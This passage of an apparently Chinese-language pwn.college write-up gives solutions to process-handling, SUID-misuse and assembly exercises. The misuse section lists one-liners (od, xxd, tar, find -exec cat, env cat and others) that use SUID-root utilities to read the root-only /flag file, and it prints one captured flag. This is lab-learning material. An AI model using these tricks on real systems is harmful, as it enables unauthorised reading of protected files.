code-wrapper"><pre><code>  In [4]: x = ,my_function /home/me    # syntax error</code></pre></div></li></ol></li></ul><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>从这题开始使用这个脚本, glob可根据 Unix 终端所用规则找出所有匹配特定模式的路径名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE) <br>p.sendline(<span class="hljs-string">&quot;password&quot;</span>)    <span class="hljs-comment"># 要加这一个</span><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><p>这题检查参数argv[1]. 要注意的是pwntools的process方法以前我都是直接使用process(“file/path”), 实际上是写到了argv[]的第0个位置, 如果<code>executable(Path to the binary to execute)</code>为None, pwntools则会使用argv[0], 这就是为什么往参数里写路径就可以执行的原因.</p><p>写成这样即可:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob <br><span class="hljs-keyword">import</span> pwn <br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>)+[<span class="hljs-string">&quot;gdncphvdkz&quot;</span>] , stdout=pwn.PIPE, stdin=pwn.PIPE) <br><br><span class="hljs-built_in">print</span>(p.read().decode())     <br></code></pre></div></td></tr></table></figure><h3 id="level18-21"><a href="#level18-21" class="headerlink" title="level18-21"></a>level18-21</h3><ul><li>18: 是环境变量, 在process的参数里加个<code>env=&#123;“balabala”=“blabla”&#125;</code>就可以了.</li><li>19: 是重定向stdin.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(<span class="hljs-string">&quot;kmtxemmo\n&quot;</span>)<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/rmxgbo&quot;</span>))<br><br><span class="hljs-built_in">print</span>(p.read().decode()) <br></code></pre></div></td></tr></table></figure><p>有一个问题: 上面的代码应该都是正确的, 但是只有再补充一句p.interactive()的时候最后两行flag才显示出来, 原因暂未知晓</p><ul><li>20: </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/tkpich&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), stdin=pwn.PIPE)<br></code></pre></div></td></tr></table></figure><ul><li>21<br>  需要清空环境变量.<br>  注意到process这个函数中的env默认会继承python的环境变量就可以了, 必须手动清空</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>), stdout=pwn.PIPE, stdin=pwn.PIPE, env=&#123;&#125;)<br><br><span class="hljs-built_in">print</span>(p.read().decode())<br></code></pre></div></td></tr></table></figure><h3 id="level-22-28"><a href="#level-22-28" class="headerlink" title="level 22-28"></a>level 22-28</h3><ul><li>22: 这部分是使用命令行执行python来执行程序的,  比较简单.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob,pwn<br>p= pwn.process(glob.glob(<span class="hljs-string">&quot;/challenge/embryo*&quot;</span>))<br>p.interactive()<br></code></pre></div></td></tr></table></figure><ul><li>23-28: 重复一遍上面的工作, 比如0 environment, redirect stdin and out, 等等这些.</li></ul><h3 id="level-29-34"><a href="#level-29-34" class="headerlink" title="level 29-34"></a>level 29-34</h3><p>从这个开始就要编译C程序了, 29写下面这一段, 30输入一个密码.</p><p>值得注意的是, 如果直接调用execve, 那么会导致bash在执行.</p><p>如果没有waitpid, 那么子进程会被/docker/init(在我的ubuntu20.04上是/sbin/init)接管. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r=execve(<span class="hljs-string">&quot;/challenge/embryoio_level30&quot;</span>, argv, envp);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><strong>31:</strong> 真的绝了, “a”原本写的是””, 父进程都不对, 过了一会儿重新编译又好了, 莫名其妙.</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br><br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-comment">//int r=execve(&quot;/challenge/embryoio_level31&quot;, argv, envp);</span><br>        <span class="hljs-keyword">int</span> r = execl(<span class="hljs-string">&quot;/challenge/embryoio_level31&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>32: 直接修改envp好像会出问题, 原因未知. </li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pwncollege</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv, <span class="hljs-keyword">char</span>** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">char</span>* argvs[<span class="hljs-number">3</span>];<br>    argvs[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;jxdefy=fbilpksemj&quot;</span>;    <span class="hljs-comment">//暂且先手动设置吧</span><br>    argvs[<span class="hljs-number">2</span>]=<span class="hljs-literal">NULL</span>;<br>    argvs[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;sldkfj&quot;</span>;<br>    <span class="hljs-keyword">if</span>(pid == <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//child process</span><br>        <span class="hljs-keyword">int</span> r = execle(<span class="hljs-string">&quot;/challenge/embryoio_level32&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;lndhvgwxjx&quot;</span>, <span class="hljs-literal">NULL</span>, argvs);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, r);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent process termianted.\n&quot;</span>);<br><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>33: 这个就是c语言版本的重定位, 还附带父进程检查的那种. 考虑到execve系列函数会直接继承原来进程的大部分属性, 比如输入输出流, 所以直接对c程序重定向即可, 子进程直接继承.</li><li>34: 输出重定向.</li></ul><h3 id="level35"><a href="#level35" class="headerlink" title="level35-"></a>level35-</h3><ul><li><p>35: 用脚本运行, 可以不需要fork, 直接execve</p></li><li><p>36: 输出要是到cat的PIPE, 直接在命令行里输入: <code>./c | cat</code>即可</p></li><li><p>37: <code>./c | grep -E &quot;*&quot;</code> 结束</p></li><li><p>38: <code>./c | sed &quot;=&quot;</code> </p></li><li><p>39: <code>./c  | rev | rev</code> </p></li><li><p>40: 使用管道重定向stdin, 去看了下c中的PIPE操作.暂时没有发现怎么用在这道题目上.</p><p><del>直接来一手三重套娃, 这样子cat就不会马上终止了</del>. md不用也可以, 是我想复杂了.</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">./cat | cat | /challenge/embryoio_level40<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//cat.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">1024</span>];<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-keyword">int</span> fd = argc == <span class="hljs-number">1</span> ? <span class="hljs-number">0</span> : open(argv[<span class="hljs-number">1</span>],<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">while</span> ((n = read(fd,buf,<span class="hljs-number">1024</span>)) &gt; <span class="hljs-number">0</span> &amp;&amp; write(<span class="hljs-number">1</span>,buf,n) &gt; <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>41: 重定向stdout. 一样做法.</li><li>42: <code>bash x.sh | cat</code></li><li>43: grep</li><li>44: sed</li><li>45: rev</li><li>46: 我累了</li></ul><h3 id="level"><a href="#level" class="headerlink" title="level??"></a>level??</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">import</span> pwn<br>pwn.context.log_level = <span class="hljs-string">&quot;DEBUG&quot;</span><br>p2 = pwn.process([<span class="hljs-string">&quot; /usr/bin/sed&quot;</span>, <span class="hljs-string">&quot;-e&quot;</span>, <span class="hljs-string">&quot;s/x/×/&quot;</span>])<br>p1 = pwn.process(glob.glob( <span class="hljs-string">&quot; /chailenge/enbryo* &quot;</span>)，stdout=p2.stdin)<br><span class="hljs-built_in">print</span>(p2.readall())<br></code></pre></div></td></tr></table></figure><h1 id="module-2-misuse"><a href="#module-2-misuse" class="headerlink" title="module 2-misuse"></a>module 2-misuse</h1><ul><li><p><a href="https://wiki.archlinux.org/title/File_permissions_and_attributes">文件权限</a> </p></li><li></li></ul><h2 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h2><p>这部分的题目就是利用被设置suid的程序来以root的权限去读文件, 无论看起来是有多么的不可能.</p><p><code>cat head tail rev nano emacs vim od more less sort hd(hexdump) xxd base32(64) split gzip bzip2 zip&amp;unzip</code><br><code>tar ar cpio genisoimage env find make </code></p><ul><li>od: <code>od -t x8z -v -w 10 /flag</code> 硬是拼出来. </li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0000000 6c6c6f632e6e7770 714f6f417b656765 685834544b387868 4e354550757a575a  &gt;pwn.college&#123;AoOqhx8KT4XhZWzuPE5N&lt;<br>0000040 2e337a6d50723671 4d734d54557a5851 0a7d577a49314d54                   &gt;q6rPmz3.QXzUTMsMTM1IzW&#125;.&lt;<br>0000070<br></code></pre></div></td></tr></table></figure><ul><li><p><code>hd /flag</code> (hexdump)</p></li><li><p><code>xxd -c60 /flag</code> 每行60个</p></li><li><p><code>base32 /flag | base32 -d</code> </p></li><li><p>split: split file into pieces. <code>split /flag</code> </p></li><li><p><code>gzip -c /flag | gzip -cd </code> </p></li><li><p>bzip2 有新的机制, 不过命令行参数和gzip非常接近</p></li><li><p><code>zip - /flag &gt; aa</code> and then<code>cat aa</code>    or    <code>unzip -p aa</code> </p></li><li><p><code>tar cf flag.tar flag</code> then <code>tar -xOf flag.tar</code> 研究了半天tar的参数, main operation那几个参数每次必须加上.f参数后紧跟文件名</p></li><li><p><code>ar c flag.ar flag</code> then <code>cat flag.ar</code> 发现经过root用户创建完archive之后直接就对其他用户可读了…更简单了</p></li><li><p>(23- )  cpio genisoimage: ???</p><ul><li><p><code>echo &quot;/flag&quot; | cpio -ov &gt; ~/flag.cpio</code> then <code>cat flagcpio</code> 不是直接将/flag放到cpio的stdin中……他只要<u>name-list</u>……</p></li><li></li></ul></li><li><p>env也行?太神奇了. <code>env cat /flag</code> </p></li><li><p><code>find /flag -maxdepth 0 -exec cat &#39;&#123;&#125;&#39; \;</code> </p></li><li></li></ul><h1 id="module-3-asm"><a href="#module-3-asm" class="headerlink" title="module 3-asm"></a>module 3-asm</h1><p>就是汇编代码的写</p><h2 id="3-简单乘法"><a href="#3-简单乘法" class="headerlink" title="3 简单乘法"></a>3 简单乘法</h2><p>要注意mul指令默认被乘数放在rax里面, 乘数由我们指定, 结果是拼接而成的: <strong>RDX:RAX</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p = process(glob(<span class="hljs-string">&quot;/challenge/e*&quot;</span>))<br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">mov rcx, rdx</span><br><span class="hljs-string">mul rsi</span><br><span class="hljs-string">add rax, rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="4-5-除法"><a href="#4-5-除法" class="headerlink" title="4-5 除法"></a>4-5 除法</h2><p>被除数放在<strong>RAX</strong>, 除数待定, 结果放在 <strong>RAX</strong>, 余数放在<strong>RDX</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, rdi</span><br><span class="hljs-string">div rsi</span><br><span class="hljs-string">mov rax, rdx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="6-低位寄存器的名称"><a href="#6-低位寄存器的名称" class="headerlink" title="6: 低位寄存器的名称"></a>6: 低位寄存器的名称</h2><p>低位寄存器的名称要特别注意, rdi就是这么写错了, mov的两个操作数如果长度不匹配会报错:<code>unsupported instruction &#39;mov&#39;</code> </p><table><thead><tr><th><strong>Name</strong></th><th>Notes</th><th>Type</th><th>64</th><th>32</th><th>16</th><th>8</th></tr></thead><tbody><tr><td>rax</td><td>Values are returned from functions in this register.</td><td>scratch</td><td>rax</td><td>eax</td><td>ax</td><td>ah and al</td></tr><tr><td>rcx</td><td>Typical scratch register.  Some instructions also use it as a counter.</td><td>scratch</td><td>rcx</td><td>ecx</td><td>cx</td><td>ch and cl</td></tr><tr><td>rdx</td><td>Scratch register.</td><td>scratch</td><td>rdx</td><td>edx</td><td>dx</td><td>dh and dl</td></tr><tr><td><em>rbx</em></td><td><em>Preserved register: don’t use it without saving it!</em></td><td><em>preserved</em></td><td><em>rbx</em></td><td><em>ebx</em></td><td><em>bx</em></td><td><em>bh and bl</em></td></tr><tr><td><em>rsp</em></td><td><em>The stack pointer.  Points to the top of the stack (details coming soon!)</em></td><td><em>preserved</em></td><td><em>rsp</em></td><td><em>esp</em></td><td><em>sp</em></td><td><em>spl</em></td></tr><tr><td><em>rbp</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>rbp</em></td><td><em>ebp</em></td><td><em>bp</em></td><td><em>bpl</em></td></tr><tr><td>rsi</td><td>Scratch register.  Function argument #2 in 64-bit Linux</td><td>scratch</td><td>rsi</td><td>esi</td><td>si</td><td>sil</td></tr><tr><td>rdi</td><td>Scratch register.  Function argument #1 in 64-bit Linux</td><td>scratch</td><td>rdi</td><td>edi</td><td>di</td><td>dil</td></tr><tr><td>r8</td><td>Scratch register.  These were added in 64-bit mode</td><td>scratch</td><td>r8</td><td>r8d</td><td>r8w</td><td>r8b</td></tr><tr><td>r9</td><td>Scratch register.</td><td>scratch</td><td>r9</td><td>r9d</td><td>r9w</td><td>r9b</td></tr><tr><td>r10</td><td>Scratch register.</td><td>scratch</td><td>r10</td><td>r10d</td><td>r10w</td><td>r10b</td></tr><tr><td>r11</td><td>Scratch register.</td><td>scratch</td><td>r11</td><td>r11d</td><td>r11w</td><td>r11b</td></tr><tr><td><em>r12</em></td><td><em>Preserved register.  You can use it, but you need to save and restore it.</em></td><td><em>preserved</em></td><td><em>r12</em></td><td><em>r12d</em></td><td><em>r12w</em></td><td><em>r12b</em></td></tr><tr><td><em>r13</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r13</em></td><td><em>r13d</em></td><td><em>r13w</em></td><td><em>r13b</em></td></tr><tr><td><em>r14</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r14</em></td><td><em>r14d</em></td><td><em>r14w</em></td><td><em>r14b</em></td></tr><tr><td><em>r15</em></td><td><em>Preserved register.</em></td><td><em>preserved</em></td><td><em>r15</em></td><td><em>r15d</em></td><td><em>r15w</em></td><td><em>r15b</em></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov al, dil</span><br><span class="hljs-string">mov bx, si</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="8-9-bitwise-op"><a href="#8-9-bitwise-op" class="headerlink" title="8-9 bitwise op"></a>8-9 bitwise op</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-number">8.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or  rax, rdi</span><br><span class="hljs-string">and rax, rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-number">9.</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">and rdi, 1</span><br><span class="hljs-string">xor rdi, 1</span><br><span class="hljs-string">xor rax, rax</span><br><span class="hljs-string">or rax, rdi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="10-开始内存操作"><a href="#10-开始内存操作" class="headerlink" title="10. 开始内存操作"></a>10. 开始内存操作</h2><p>注意add没有 <code>add mem, imm</code>这种形式, 因为时钟周期根本不够 </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">mov rdx, 0x404000 </span><br><span class="hljs-string">mov rcx, [rdx] </span><br><span class="hljs-string">mov rax, rcx </span><br><span class="hljs-string">add rcx, 0x1337 </span><br><span class="hljs-string">mov [rdx], rcx </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>11.简单的rax, eax, ax, ah, al的使用.</p><p>12.要注意时钟周期的问题. 常数要先移动到寄存器</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov rax, 0xdeadbeef00001337</span><br><span class="hljs-string">mov rbx, 0x000000C0FFEE0000</span><br><span class="hljs-string">mov [rdi], rax</span><br><span class="hljs-string">mov [rsi], rbx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>13.利用地址偏移, 简单的.</p><h2 id="14-16-栈相关指令-太简单了-都是些基础题-过了就算了"><a href="#14-16-栈相关指令-太简单了-都是些基础题-过了就算了" class="headerlink" title="14-16.栈相关指令. 太简单了, 都是些基础题, 过了就算了"></a>14-16.栈相关指令. 太简单了, 都是些基础题, 过了就算了</h2><h2 id="17-跳转"><a href="#17-跳转" class="headerlink" title="17. 跳转"></a>17. 跳转</h2><p>nop的数量数错了, 诶他说的是0x51 bytes from current position, 但是这指的是jmp后面一条指令的地址. 不是jmp的起始地址…..</p><p>还要注意<code>绝对跳转只能是间接跳转(line 6)</code>( 要和<code>条件跳转只能是直接跳转</code>一起记清楚 )</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">jmp L1</span><br><span class="hljs-string">(0x51 nops)</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string">mov rcx, 0x403000</span><br><span class="hljs-string">jmp rcx</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><p>18.if-elif-else连环, 要注意的是他说[rdi]是一个双字, 可能是一个负数, 所以我第一次写的<code>QWORD PTR</code>就错了, 只能是<code>DWORD PTR</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">mov eax, [rdi+4]</span><br><span class="hljs-string">mov r8d, [rdi+8]</span><br><span class="hljs-string">mov r9d, [rdi+12]</span><br><span class="hljs-string">cmp DWORD ptr [rdi], 0x7f454c46 #!!!!!!</span><br><span class="hljs-string">jne leif</span><br><span class="hljs-string">add eax, r8d</span><br><span class="hljs-string">add eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">leif:</span><br><span class="hljs-string">cmp DWORD PTR[rdi], 0x00005A4D #!!!!!!                                                 </span><br><span class="hljs-string">jne else</span><br><span class="hljs-string">sub eax, r8d</span><br><span class="hljs-string">sub eax, r9d</span><br><span class="hljs-string">jmp done</span><br><span class="hljs-string"></span><br><span class="hljs-string">else:</span><br><span class="hljs-string">    mul r8d</span><br><span class="hljs-string">    mul r9d</span><br><span class="hljs-string"></span><br><span class="hljs-string">done:</span><br><span 